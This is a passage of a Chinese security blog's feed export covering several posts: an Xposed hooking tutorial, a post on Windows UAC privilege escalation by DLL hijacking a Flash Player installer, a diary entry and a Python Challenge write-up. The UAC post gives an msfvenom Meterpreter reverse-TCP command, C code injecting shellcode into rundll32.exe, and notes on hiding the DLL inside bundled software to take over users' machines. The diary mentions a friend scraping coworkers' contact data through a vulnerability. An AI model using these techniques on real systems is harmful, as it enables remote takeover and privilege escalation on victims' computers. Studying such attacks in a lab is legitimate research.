<h4 id="为什么要控制zygote进程">为什么要控制zygote进程</h4><p>在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。所以如果选择对Zygote进程Hook，则能够达到针对系统上所有的应用程序进程Hook，即一个全局Hook。这也是Xposed选择替换app_process的原因。如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-2.jpg" alt="hook-before-after"></p>
<p>Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。</p>
<h4 id="Hook/Replace">Hook/Replace</h4><p>Xposed 框架中真正起作用的是对方法的hook。在Repackage技术中，如果要对APK做修改，则需要修改Smali代码中的指令。而另一种动态修改指令的技术需要在程序运行时基于匹配搜索来替换smali代码，但因为方法声明的多样性与复杂性，这种方法也比较复杂。</p>
<p>总结Hook运行过程如下：</p>
<ol>
<li><p>在Android系统启动的时候，zygote进程加载XposedBridge将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法xposedCallHandler，xposedCallHandler在转入handleHookedMethod这个Java方法执行用户规定的Hook Func。</p>
</li>
<li><p>在hookMethodNative的实现中,会调用XposedBridge中的handleHookedMethod这个方法来传递参数;<br>XposedBridge这个jar包含有一个私有的本地方法：hookMethodNative，该方法在附加的app_process程序中也得到了实现。它将一个方法对象作为输入参数（你可以使用Java的反射机制来获取这个方法）并且改变Dalvik虚拟机中对于该方法的定义。它将该方法的类型改变为native并且将这个方法的实现链接到它的本地的通用类的方法。换言之，当调用那个被hook的方法时候，通用的类方法会被调用而不会对调用者有任何的影响。</p>
</li>
<li><p>handleHookedMethod这个方法类似于一个统一调度的Dispatch例程,其对应的底层的C++函数是xposedCallHandler;</p>
</li>
<li><p>handleHookedMethod实现里面会根据一个全局结构hookedMethodCallbacks来选择相应的hook函数,并调用他们的before,after函数;</p>
</li>
<li><p>当多模块同时Hook一个方法的时候，Xposed会自动根据Module的优先级来排序，调用顺序如下：<br>A.before -&gt; B.before -&gt; original method -&gt; B.after -&gt; A.after</p>
</li>
</ol>
<h4 id="Xposed代码分析">Xposed代码分析</h4><p>详见<a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="external">Android Hook框架Xposed原理与源代码分析</a></p>
<h3 id="Xposed插件编写">Xposed插件编写</h3><p>创建一个插件XposedExample，hook掉系统handleLoadPackage，在系统调用之前打印出加载app的package name，工程用eclipse编写，android studio略有不同。</p>
<p>1.创建一个Blank Activity的android项目</p>
<p>2.工程目录新建lib文件夹，添加文件<a href="http://forum.xda-developers.com/xposed/xposed-api-changelog-developer-news-t2714067" target="_blank" rel="external">XposedBridgeApi-54.jar</a>，然后右键-Build path。</p>
<p>3.修改AndroidManifest.xml，插入xposed元数据。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不想让插件在系统中显示图标，就把activity给注释掉。</p>
<p>4.完整的的AndroidManifest.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">manifest</span> <span class="attribute">xmlns:android</span>=<span class="value">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    <span class="attribute">package</span>=<span class="value">"com.idhyt.xposedexample"</span></span><br><span class="line">    <span class="attribute">android:versionCode</span>=<span class="value">"1"</span></span><br><span class="line">    <span class="attribute">android:versionName</span>=<span class="value">"1.0"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">uses-sdk</span></span><br><span class="line">        <span class="attribute">android:minSdkVersion</span>=<span class="value">"8"</span></span><br><span class="line">        <span class="attribute">android:targetSdkVersion</span>=<span class="value">"21"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">application</span></span><br><span class="line">        <span class="attribute">android:allowBackup</span>=<span class="value">"true"</span></span><br><span class="line">        <span class="attribute">android:icon</span>=<span class="value">"@drawable/ic_launcher"</span></span><br><span class="line">        <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span></span><br><span class="line">        <span class="attribute">android:theme</span>=<span class="value">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">         <span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">".XposedExample"</span></span><br><span class="line">            <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span> //和XposedBridgeApi-54.jar版本对应</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="title">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.编写插件代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.idhyt.xposedexample;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XposedExample</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">"Loaded app: "</span> + lpparam.packageName);</span><br><span class="line">        XposedBridge.log(<span class="string">"this is a test by idhyt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>6.在assets文件夹(如果不存在就创建)下新建file写入插件启动入口:<br><code>com.idhyt.xposedexample.XposedExample</code></p>
<p>整个工程目录如下所示:<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-3e.jpg" alt="project-dir"></p>
<p>7.运行之后 会在虚拟机中看到我们的插件已经安装到xposed模块里边，然后勾选重启系统。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-4.jpg" alt="install-ok"></p>
<p>8.重启过后，加入过滤规则“loaded app”，在logcat窗口会看到我们的输出日志信息，你打开应用也会显示加载的应用包名。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-5.jpg" alt="logcat-out"></p>
<h3 id="xposed用法详解">xposed用法详解</h3><p>移步：<a href="http://blog.idhyt.com/2015/11/28/4-android-injection-xposed-usage/">安卓注入框架Xposed用法详解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[借用UAC完成的提权思路]]></title>
    <link href="http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/"/>
    <id>http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/</id>
    <published>2015-08-31T14:41:11.000Z</published>
    <updated>2016-01-23T07:51:25.000Z</updated>
    <content type="html"><![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
<h2 id="提权过程概述">提权过程概述</h2><p>首先我们找到目标程序，查找其动态加载的dll文件然后将其替换掉，插入我们包含shellcode的dll文件，这样用户在安装此文件的时候就会调用我们的dll文件，并执行我们的shellcode代码。同时为了防止程序崩掉导致我们的代码退出，采用注入的方式保证shellcode的稳定执行。在此过程中，如果目标程序请求UAC权限，对于用户来说这是一个正常的安装文件，一旦通过UAC验证，相应我们的shellcode也完成了提权过程。替换安装包dll文件这种行为太过于敏感，其实最后实现的方式是找到目标程序需要加载的，并且当前目录又不存在的需要联网下载的dll文件，我们只需要在该目录下放一个同名dll文件即可。</p>
<h2 id="实验环境">实验环境</h2><ul>
<li><p>Kali Debian7<br>Kali集成Metasploit等漏洞利用工具，方便提取shellcode和反弹TCP连接。最好安装一个Mingw-w64用于编译c代码。</p>
</li>
<li><p>windows7 x64<br>主要的目标测试环境。</p>
</li>
<li><p>Procmon.exe<br>Procmon是微软出的一款强大的Windows监视工具，不但可以监视进程/线程，还可以监控到文件系统，注册表的变化等。</p>
</li>
<li><p>install_flashplayer15x32_mssd_aaa_aih<br>这里我们以flashplayer安装文件作为目标文件，版本为15x32_mssd_aaa_aih，可自行下载，或者从最后的打包附件中找到。</p>
</li>
</ul>
<h2 id="详细提权过程">详细提权过程</h2><h3 id="查找可劫持的dll文件">查找可劫持的dll文件</h3><p>首先我们在win7系统下先打开procmon监控软件，清除一下日志信息，然后运行我们的目标文件install_flashplayer15x32_mssd_aaa_aih，运行过后会弹出UAC选项，需要用户确认授权。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-1.jpg" alt=""></p>
<p>这里我们点“是”，然后安装包开始安装并自删除，并从服务器下载所需的文件，这时候就可以关掉了，因为我们只需要看该软件包都加载了哪些dll文件。</p>
<p>看下Procmon.exe记录所有行为<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-2.jpg" alt=""></p>
<p>信息量太大，我们需要过滤出有用的信息。</p>
<p>首先是只看我们目标进程的信息，添加过滤规则：</p>
<pre><code><span class="keyword">Process</span> Name <span class="keyword">is</span> install_flashplayer15x32_mssd_aaa_aih
</code></pre><p>然后是过滤掉加载系统的dll文件，只看安装包当前目录下加载的dll文件，我这里安装包存放在dllhijack文件夹下，添加过滤规则：</p>
<pre><code>Path <span class="keyword">contains</span> dllhijack
</code></pre><p>并且该加载dll不存在，需要联网从服务器下载，最后再添加一个过滤规则：</p>
<pre><code><span class="keyword">Result</span> <span class="keyword">is</span> NAME <span class="keyword">NOT</span> FOUND
</code></pre><p>三个过滤规则如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-3.jpg" alt=""></p>
<p>经过三个规则过滤后，留下的信息就很明显了，如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-4.jpg" alt=""></p>
<p>上边所列的dll文件都是会尝试加载，并且找不到，会联网进行下载的dll文件，因此，我们的目标就是劫持这些dll文件，也不需要替换，直接将我们的dll文件放在安装包同目录即可，这也是为什么选择这个安装程序测试的原因。如果选择其他安装包测试的，最好也是选择这种联网安装类型的，所有文件都从服务器拉取，如果安装程序没有对这些从服务器拉取的文件进行效验，就能够被劫持。</p>
<h3 id="编写exploit">编写exploit</h3><p>找到劫持了dll文件后，我们进入Debian系统用msf生成shellcode，这里我们选择反弹tcp的shellcode，需要知道服务器ip地址和监听端口，这里也选择Debian系统作为服务器，ifconfig查看下ip，设置监听端口为9000，最后执行如下命令生成shellcode:</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.133</span> LPORT=<span class="number">9000</span> -f c
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-5.jpg" alt=""></p>
<p>为了防止程序挂掉或者退出导致shellcode也跟着退出，采用注入的方式，将shellcode注入rundll32.exe进程，然后连接远程端口。服务器监听该端口，一旦有请求就建立会话连接，注入关键代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (CreateProcess(<span class="number">0</span>, <span class="string">"rundll32.exe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, <span class="number">0</span>, <span class="number">0</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;</span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ep = (LPVOID)VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(pi.hProcess, (PVOID)ep, &amp;code, SCSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">			ctx.Rip = (DWORD64)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">			ctx.Eip = (DWORD)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后将程序编译，这里编译直接在Debian系统下用Mingw-w64编译，命令入下：</p>
<pre><code>root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># i686-w64-mingw32-gcc template.c -o template.dll –shared</span>
root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># file template.dll</span>
template.<span class="symbol">dll:</span> <span class="constant">PE32</span> executable (<span class="constant">DLL</span>) (console) <span class="constant">Intel</span> <span class="number">80386</span>, <span class="keyword">for</span> <span class="constant">MS</span> <span class="constant">Windows</span>
</code></pre><p>将编译好的template.dll拷贝到win7系统中备用。<br>debian系统设置服务器并监听9000端口，所有命令如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-6.jpg" alt=""></p>
<h3 id="提权">提权</h3><p>将编译的template.dll文件放在install_flashplayer15x32_mssd_aaa_aih目录下，从我们监控到的可劫持dll文件中选择一个，这里我选择dhcpcsv6.dll。将我们的dll文件改名为dhcpcsvc6.dll，其他dll文件可自行尝试。之后重新运行安装包，弹出UAC选项后点“是”。</p>
<p>之后我们在debian系统的服务端会看到我们已经监听到了这个端口，看下会话信息：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-7.jpg" alt=""></p>
<p>查看下当前uid，然后执行getsystem命令权限：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-8.jpg" alt=""></p>
<p>可以看到已经提权成功，然后进入shell查看下文件，运行个计算器什么的。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-privilege-escalation-by-uac-9.jpg" alt=""></p>
<h2 id="总结">总结</h2><p>UAC很大程度上减少PC受到恶意软件侵害的机会，但是并不表明是不可被利用的。通过这种dll劫持方式，可以将dll文件设置为隐藏，并将正常的软件(如adobe flash player)打包给用户，用户基本是察觉不到的，一旦用户正常安装，机器就会被攻击者控制。一些病毒通过劫持lpk.dll等系统dll文件造成的病毒体执行，也是利用这种思路。</p>
<p>代码和安装包上传<a href="http://pan.baidu.com/s/1ntAbfQD" target="_blank" rel="external">百度网盘</a>，<br>密码: rmsq 解压码：ks123456</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。]]>
    </summary>
    
      <category term="uac" scheme="http://blog.idhyt.com/tags/uac/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[生活碎碎念]]></title>
    <link href="http://blog.idhyt.com/2015/08/22/diary-2015-08-22/"/>
    <id>http://blog.idhyt.com/2015/08/22/diary-2015-08-22/</id>
    <published>2015-08-22T07:06:11.000Z</published>
    <updated>2015-12-31T11:45:54.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。</p>
<p>&#160; &#160; &#160; &#160;简单的生活习惯了，如果有点复杂的事情，自己可能就会不自觉的去抵制，这么久唯一做的感觉有点后悔的事情就是把一个朋友微信给删了，当时有了被忽视的感觉，其实也是有点太过于在乎了。大学毕业后所有朋友的相处方式都是君子之交淡如水的感觉，玩一起的人都是时间轴上的特定事件，没有刻意去经营一些圈子，是这种感觉，不是什么非你不可，而是有你更好。想到了之前微信群里突然正经的讨论了如何定义坏人，我当时说了，只要这个人对我以及我身边的人没有威胁，那我就认为不算是坏人，至于他对于社会的危害，我想我是不能控制的。其实这就是一个没有结果的命题，就相当于每个人定义朋友的方式不同，一个对别人刻薄和不负责人的人，如果对你还ok，你为什么要去否定它？一个对别人还ok，对你总是刻薄的人，你为何要去肯定它？人和人有不同的交集，可能接触的焦点也不同，就简单的去相信它吧。</p>
<p>&#160; &#160; &#160; &#160;这个渔村不知道有什么特殊的灵气，来这边以后就会经常做梦，而且睡眠还不是很好，总是容易半夜醒，而且有点噪声就会惊醒，之前在家和在学校都是一觉睡到大中午，生活从来没上午的，对于噪声，天空掉下五个字，那都不是事，现在可能慢慢习惯这样了，就不会去特别刻意在意这些反而好了很多，晚上先在床上滚一会找个舒服的姿势，然后就能睡着了，不过还是会做梦，梦太多了，我都忘记梦的是什么了，读研时候我记得有次我好不容易做个梦，然后在梦里不知道碰到什么事情了笑了出来，然后笑声把自己惊醒了，宿舍那三个也是各种惊悚。</p>
<p>&#160; &#160; &#160; &#160;想到了前几天有个高中同学突然QQ上加我，我当时以为有什么事情就问了她，她说好多朋友几年没联系了也找不到了，QQ自动推荐的人中看到了我就加了，我当时也是挺有些感慨的聊了几句。然后过了两天，我的QQ空间里的动态全是她卖面膜，化妆品的广告，还加我微信我果断拒绝了，怎么好好的一个人，说推销就推销呢，这种感情绑架真的很讨人烦。经常会看到朋友发借钱不还又不好意思要，要了就是丢掉一个朋友，我也是深有体会，我穷我有理的感觉。为什么我们不能做好朋友，为什么有的人不经常联系了就是陌生人，有些人不经常联系了一点都不疏远，这些想法都是大脑来做出的决定，大脑也是被认为是最聪明的东西，可是你再仔细想想，做出这个判断的却是大脑自己啊，思想真奇妙。</p>
<p>&#160; &#160; &#160; &#160;昨天耗子在群里发了张照片，是我们快毕业时候去四姑娘山玩的时候合照，被挂在了海螺沟的宾馆，感觉还是有点点意外。想想大家那会多欢乐呢，几个人天天在工作室里边写毕业论文边想着怎么玩，周末就一起出去吃个饭看电影，这样的生活也只能在学校才有能去消费，工作之后感觉能玩的朋友越来越少了，大家都有了自己的圈子，铁打的领导和流水的实习生，感觉一切可以认识到新朋友的机会都像是一件奢侈品。</p>
<p>&#160; &#160; &#160; &#160;一个朋友经常在公司碰到一个妹子，是喜欢的类型但又不好意思去主动认识，他写了个爬虫工具利用某些漏洞把整个公司的人的联系方式和照片全爬了下来，放在硬盘里好久也没有去找这个妹子的联系方式，但下次碰到了还是觉得很想去认识，一直到现在都还没有和她有任何交集，好像自己他没有这些资料一样。人或许都有这样一种心态，对一种不可预知结果的事情总是充满了幻想并充满了期待，一旦知道这件事的结果，好像觉得可有可无了并把自己催眠到一种不可预知的状态。</p>
<p>&#160; &#160; &#160; &#160;这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。于千万人之中，遇见你所要遇见的人；于千万年之中，没有早一步，没有晚一步，刚巧赶上了，那也没有别的话可说，只有相视一笑，享受这美好时光。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 21-27]]></title>
    <link href="http://blog.idhyt.com/2015/08/13/python-challenge-21-27/"/>
    <id>http://blog.idhyt.com/2015/08/13/python-challenge-21-27/</id>
    <published>2015-08-13T13:55:11.000Z</published>
    <updated>2015-12-31T12:08:27.000Z</updated>
    <content type="html"><![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
<h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Yes! This <span class="keyword">is</span> really level <span class="number">21</span> <span class="keyword">in</span> here. </span><br><span class="line">And yes, After you solve it, yo<span class="string">u'll be in level 22!</span><br><span class="line"></span><br><span class="line">Now for the level:</span><br><span class="line"></span><br><span class="line">* We used to play this game when we were kids</span><br><span class="line">* When I had no idea what to do, I looked backwards.</span></span><br></pre></td></tr></table></figure></p>
<p>说这是个小时候的游戏，击鼓传花，国外的玩法不一样，需要一层层地拆传递的那个东西<br>level 20下载到的那个压缩包的package.pack文件是个压缩文件，使用了zlib和bz2两种方式压缩。<br>需要根据上一次解压得到的结果，判断下一次解压用zlib还是bz2，以及判断得到的数据是正向的还是要look backwards。<br>Zlib压缩的数据开头第一个字节是”\x78”,ASCII码是”x”.<br>BZ压缩的数据开头两个字节是”\x42\x7A”,ASCII码是”BZ”.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    <span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">    data = open(<span class="string">"files/invader/package.pack"</span>, <span class="string">"rb+"</span>).read()</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">"x\x9c"</span>):</span><br><span class="line">            data = zlib.decompress(data)</span><br><span class="line">            result.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.startswith(<span class="string">"BZ"</span>):</span><br><span class="line">            data = bz2.decompress(data)</span><br><span class="line">            result.append(<span class="string">"#"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"\x9cx"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"ZB"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"*"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span>.join(result)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">      <span class="comment">###          ###      ########    ########    ##########  ########</span></span><br><span class="line">    <span class="comment">#######      #######    #########   #########   #########   #########</span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  #########   #########   ########    #########</span></span><br><span class="line">  <span class="comment">##           ##       ##  ########    ########    ########    ######## </span></span><br><span class="line">  <span 